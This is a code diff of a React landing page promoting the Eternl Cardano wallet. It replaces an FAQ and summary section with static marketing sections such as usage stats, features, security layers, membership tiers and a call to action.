-          <p className="leading-relaxed">
-            Yes, Eternl Wallet supports Cardano NFTs and integrates with hardware wallets such as Ledger and Trezor for enhanced security.
-          </p>
-        </div>
-      </div>
-
-      {/* Final Thoughts */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Final Thoughts on Eternl Wallet</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Summary Based on Real-World Usage</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet provides a feature-rich environment for managing Cardano assets with full user control. Its focus on security, staking, and dApp connectivity makes it a strong option for Cardano participants. Users should balance its advanced capabilities with responsible self-custody practices.
-          </p>
         </div>
       </div>
     </section>
+  );
+}
+
+function StatsSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 py-12 border-y border-white/5 bg-black/20">
+      <div className="grid grid-cols-2 md:grid-cols-4 gap-8 divide-x divide-white/5">
+        <div className="flex flex-col items-center text-center px-4">
+          <div className="w-10 h-10 bg-red-500/10 rounded-full flex items-center justify-center mb-4">
+            <i data-lucide="users" className="w-5 h-5 text-red-400" />
+          </div>
+          <div className="text-3xl font-medium tracking-tight text-white mb-1">300K+</div>
+          <div className="text-sm text-gray-500">Active Users</div>
+        </div>
+        <div className="flex flex-col items-center text-center px-4">
+          <div className="w-10 h-10 bg-yellow-500/10 rounded-full flex items-center justify-center mb-4">
+            <i data-lucide="coins" className="w-5 h-5 text-yellow-400" />
+          </div>
+          <div className="text-3xl font-medium tracking-tight text-white mb-1">$2.5B+</div>
+          <div className="text-sm text-gray-500">Assets Managed</div>
+        </div>
+        <div className="flex flex-col items-center text-center px-4">
+          <div className="w-10 h-10 bg-orange-500/10 rounded-full flex items-center justify-center mb-4">
+            <i data-lucide="activity" className="w-5 h-5 text-orange-400" />
+          </div>
+          <div className="text-3xl font-medium tracking-tight text-white mb-1">1M+</div>
+          <div className="text-sm text-gray-500">Transactions</div>
+        </div>
+        <div className="flex flex-col items-center text-center px-4">
+          <div className="w-10 h-10 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
+            <i data-lucide="trending-up" className="w-5 h-5 text-green-400" />
+          </div>
+          <div className="text-3xl font-medium tracking-tight text-white mb-1">99.9%</div>
+          <div className="text-sm text-gray-500">Uptime</div>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function FeaturesSection() {
+  return (
+    <section className="max-w-6xl mx-auto px-6 py-32">
+      <div className="text-center mb-24">
+        <span className="text-xs font-medium text-orange-400 bg-orange-400/10 px-3 py-1 rounded-full border border-orange-400/20">
+          Powerful Features
+        </span>
+        <h2 className="text-4xl md:text-5xl font-medium tracking-tight text-white mt-6 mb-6">
+          Everything You Need to
+          <br />
+          <span className="text-orange-500">Master Cardano</span>
+        </h2>
+      </div>
+      <div className="grid md:grid-cols-2 gap-12">
+        <FeatureItem icon="shield" title="Non-Custodial Security" desc="Complete control over private keys. We never access your recovery phrases." />
+        <FeatureItem icon="layers" title="Multi-Account Support" desc="Unlimited accounts and sub-addresses for organized asset management." />
+        <FeatureItem icon="zap" title="One-Click Staking" desc="Delegate to pools instantly and earn passive ADA without complexity." />
+        <FeatureItem icon="globe" title="dApp Connector" desc="Seamless connection to Cardano DeFi, NFT markets, and decentralized apps." />
+      </div>
+    </section>
+  );
+}
+
+function FeatureItem({ icon, title, desc }: { icon: string; title: string; desc: string }) {
+  return (
+    <div className="bg-[#121214] border border-white/5 rounded-2xl p-6">
+      <div className="w-12 h-12 bg-orange-500/10 rounded-xl border border-orange-500/20 flex items-center justify-center mb-6">
+        <i data-lucide={icon} className="w-6 h-6 text-orange-400" />
+      </div>
+      <h3 className="text-xl font-medium text-white mb-3">{title}</h3>
+      <p className="text-base text-gray-400">{desc}</p>
+    </div>
+  );
+}
+
+function TimelineSection() {
+  return (
+    <section className="max-w-4xl mx-auto px-6 py-32">
+      <div className="text-center mb-20">
+        <h2 className="text-4xl font-medium tracking-tight text-white">
+          What Is <span className="text-orange-500">Eternl Wallet</span>?
+        </h2>
+      </div>
+      <div className="space-y-8">
+        <TimelineRow title="A Cardano-Native Web Wallet" text="Feature-rich browser wallet designed exclusively for Cardano." />
+        <TimelineRow title="True Self-Custody" text="You hold your keys and stay in complete control." />
+        <TimelineRow title="Gateway to dApps" text="Connect to DEXes, NFT markets, and lending protocols." />
+        <TimelineRow title="Built for Security" text="Encryption, hardware support, and verification by default." />
+      </div>
+    </section>
+  );
+}
+
+function TimelineRow({ title, text }: { title: string; text: string }) {
+  return (
+    <div className="bg-[#121214] border border-white/5 rounded-xl p-6">
+      <h3 className="text-lg font-medium text-white mb-2">{title}</h3>
+      <p className="text-sm text-gray-400">{text}</p>
+    </div>
+  );
+}
+
+function MythsRealitySection() {
+  return (
+    <section className="max-w-6xl mx-auto px-6 py-24 bg-[#0d0d0f] rounded-3xl border border-white/5">
+      <div className="text-center mb-16">
+        <h2 className="text-4xl font-medium tracking-tight text-white">
+          Why You Should Consider <span className="text-orange-500">Eternl Wallet</span>
+        </h2>
+      </div>
+      <div className="grid md:grid-cols-2 gap-px bg-white/5 border border-white/5 rounded-2xl overflow-hidden">
+        <MythCard type="COMMON MYTH" text='"Crypto wallets are confusing and hard to use."' negative />
+        <MythCard type="ETERNL REALITY" text="Intuitive interface designed for both beginners and power users." />
+        <MythCard type="COMMON MYTH" text='"My funds could be stolen if the company shuts down."' negative />
+        <MythCard type="ETERNL REALITY" text="Non-custodial: you own keys, ensuring access anytime." />
+      </div>
+    </section>
+  );
+}
+
+function MythCard({ type, text, negative }: { type: string; text: string; negative?: boolean }) {
+  return (
+    <div className={`${negative ? "bg-[#0d0d0f]" : "bg-[#121214]"} p-8`}>
+      <div className={`text-xs font-medium mb-2 ${negative ? "text-red-400" : "text-orange-400"}`}>{type}</div>
+      <p className={`text-sm ${negative ? "text-gray-300 italic" : "text-gray-300"}`}>{text}</p>
+    </div>
+  );
+}
+
+function SecurityStackSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 py-32 grid md:grid-cols-2 gap-16 items-center">
+      <div className="relative h-[400px] flex items-center justify-center">
+        <div className="relative w-32 h-32 bg-gradient-to-b from-orange-500 to-red-600 rounded-3xl flex items-center justify-center shadow-[0_0_40px_rgba(249,115,22,0.3)] border border-orange-400/50">
+          <i data-lucide="shield" className="w-16 h-16 text-white" />
+        </div>
+      </div>
+      <div>
+        <h2 className="text-4xl md:text-5xl font-medium tracking-tight text-white mb-6">
+          Multi-Layer <span className="text-orange-500">Security Stack</span>
+        </h2>
+        <div className="space-y-4 text-gray-400">
+          <p>Layer 1: Local key storage</p>
+          <p>Layer 2: Password encryption</p>
+          <p>Layer 3: Biometric authentication</p>
+          <p>Layer 4: Hardware wallet support</p>
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function HowItWorksSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 py-24 border-y border-white/5 bg-black/20">
+      <div className="text-center mb-20">
+        <h2 className="text-4xl font-medium tracking-tight text-white">
+          How <span className="text-orange-500">Eternl</span> Works
+        </h2>
+      </div>
+      <div className="grid md:grid-cols-3 lg:grid-cols-6 gap-4">
+        {["Launch App", "Create or Import", "Secure Wallet", "Add Your ADA", "Start Using", "Earn Rewards"].map((step) => (
+          <div key={step} className="bg-[#121214] border border-white/10 rounded-xl p-4 text-center text-sm text-gray-300">
+            {step}
+          </div>
+        ))}
+      </div>
+    </section>
+  );
+}
+
+function UseCasesSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 py-32">
+      <div className="text-center mb-16">
+        <h2 className="text-4xl md:text-5xl font-medium tracking-tight text-white">
+          What You Can Do with <span className="text-orange-500">Eternl Wallet</span>
+        </h2>
+      </div>
+      <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+        <UseCaseCard title="Staking & Rewards" text="Delegate ADA to pools and earn rewards while keeping custody." />
+        <UseCaseCard title="Governance Voting" text="Participate in proposals and shape Cardano's future." />
+        <UseCaseCard title="NFT Management" text="View, manage, and send native Cardano NFTs." />
+      </div>
+    </section>
+  );
+}
+
+function UseCaseCard({ title, text }: { title: string; text: string }) {
+  return (
+    <div className="bg-[#121214] border border-white/5 rounded-2xl p-8">
+      <h3 className="text-2xl font-medium text-white mb-4">{title}</h3>
+      <p className="text-base text-gray-400">{text}</p>
+    </div>
+  );
+}
+
+function MembershipSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 py-24 border-t border-white/5">
+      <div className="text-center mb-16">
+        <h2 className="text-4xl md:text-5xl font-medium tracking-tight text-white">
+          Unlock Exclusive <span className="text-orange-500">Membership Cards</span>
+        </h2>
+      </div>
+      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+        <MembershipCard rarity="Common" title="Pioneer" />
+        <MembershipCard rarity="Rare" title="Staker Elite" />
+        <MembershipCard rarity="Epic" title="Security Guardian" />
+        <MembershipCard rarity="Legendary" title="Founding Member" />
+      </div>
+    </section>
+  );
+}
+
+function MembershipCard({ rarity, title }: { rarity: string; title: string }) {
+  return (
+    <div className="bg-[#121214] border border-white/10 rounded-2xl p-6">
+      <div className="text-xs text-orange-400 mb-3">{rarity}</div>
+      <h3 className="text-lg font-medium text-white">{title}</h3>
+    </div>
+  );
+}
+
+function FaqSection() {
+  return (
+    <section className="max-w-3xl mx-auto px-6 py-32">
+      <div className="text-center mb-16">
+        <h2 className="text-4xl font-medium tracking-tight text-white">
+          Frequently Asked <span className="text-orange-500">Questions</span>
+        </h2>
+      </div>
+      <div className="space-y-3">
+        {[
+          "Is Eternl Wallet free to use?",
+          "How do I keep my wallet secure?",
+          "Can I stake my ADA with Eternl?",
+          "Can I use Eternl on mobile?",
+        ].map((q) => (
+          <div
+            key={q}
+            className="bg-[#121214] border border-white/5 rounded-xl p-5 flex justify-between items-center hover:bg-white/5 transition-colors"
+          >
+            <span className="text-sm font-medium text-gray-300">{q}</span>
+            <i data-lucide="chevron-down" className="w-4 h-4 text-gray-500" />
+          </div>
+        ))}
+      </div>
+    </section>
+  );
+}
+
+function CtaSection() {
+  return (
+    <section className="w-full bg-gradient-to-r from-orange-600 to-red-600 py-24 relative overflow-hidden">
+      <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-white/10 rounded-full blur-[100px]" />
+      <div className="max-w-4xl mx-auto px-6 text-center relative z-10">
+        <h2 className="text-4xl md:text-6xl font-medium tracking-tight text-white mb-6">
+          Ready to Take Control
+          <br />
+          of Your ADA?
+        </h2>
+        <button className="bg-white text-orange-600 px-8 py-4 rounded-full text-base font-medium hover:bg-gray-50 transition-colors shadow-xl">
+          Get Eternl Now
+        </button>
+      </div>
+    </section>
+  );
+}
+
+function FooterSection() {
+  return (
+    <footer className="bg-[#0a0a0a] pt-20 pb-10 border-t border-white/5">
+      <div className="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-12 mb-16">
+        <div className="lg:col-span-2">
+          <div className="flex items-center gap-2 mb-6">
+            <div className="w-8 h-8 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-md flex items-center justify-center">
+              <span className="text-white font-semibold text-lg">E</span>
+            </div>
+            <span className="text-white font-medium text-xl tracking-tight">Eternl</span>
+          </div>
+          <p className="text-sm text-gray-500 max-w-sm">
+            The most trusted Cardano wallet for secure, non-custodial asset management.
+          </p>
+        </div>
+      </div>
+      <div className="text-center text-xs text-gray-600 pt-8 border-t border-white/5">
+        © 2024 Eternl Wallet. All rights reserved.
+      </div>
+    </footer>
   );
 }
